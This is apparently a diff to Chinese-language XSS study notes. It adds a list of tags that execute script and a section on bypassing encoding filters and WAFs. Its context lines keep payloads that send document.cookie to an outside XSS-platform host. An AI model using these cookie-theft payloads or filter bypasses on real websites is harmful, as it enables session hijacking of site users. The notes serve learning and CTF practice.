@@ -52,7 +52,6 @@ if(''==1){keep=new Image();keep.src='https://xss.pt/xss.php?do=keepsession&id=Sh
 
 ```html
 <BODY ONLOAD=document.location='https://xss.pt/Sh8sp.jpg?cookie='+document.cookie;></body>
-
 ```
 
 > **window.onload()** 方法用于在网页加载完毕后立刻执行的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。
@@ -61,16 +60,51 @@ if(''==1){keep=new Image();keep.src='https://xss.pt/xss.php?do=keepsession&id=Sh
 
 换成`/**/`
 
-#### 其他
+
+## 常见执行`XSS`的标签
 
 ```html
+<script src="*.js"></script>
+
+<script>alert(1)</script>
+
 <img src="s" onerror=alert('xss')></img>
+
+<link rel="import" href="*.html">
+
+<iframe src="javascript:alert(1)"></iframe> <!-JavaScript伪协议->
+
+<a href="javascript:alert(1)">click</a>
+
+<svg/onload=alert(1)>
+
+<h1 onmousemove="alert('moved!')">Title1</h1>
+    
+<iframe src = "data:text/html;base64,_base64codehere="></iframe> <!-Data伪协议->
 ```
 
+## XSS过滤和绕过
 
+> XSS主要在**代码层**和**WAF层**实现过滤
+
+### 编码过滤
+
+1. 对payload进行HTML实体编码过滤
+
+   `alert(1)`编码成`&#x61 &#x6c...`
+
+   payload在标签属性中触发事件前，浏览器已经对payload进行了一次解码，即从实体编码转换成了常规数据。
+
+2. 通过闭合JS语句逃逸payload
+
+   `var url = 'http://xss.com/?name=<?=$name?>'+'<?=$address?>';`
+
+   可转义第一个引号使其和第二个参数的引号闭合 在第二个参数内插入payload
+
+3. 
 
 ## 参考
 
 [1] [XSS平台的使用](http://zhuabapa.top/2019/12/25/XSS%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/)
 
-[2] []()
+[2] [从0到1:CTFer](#xss)
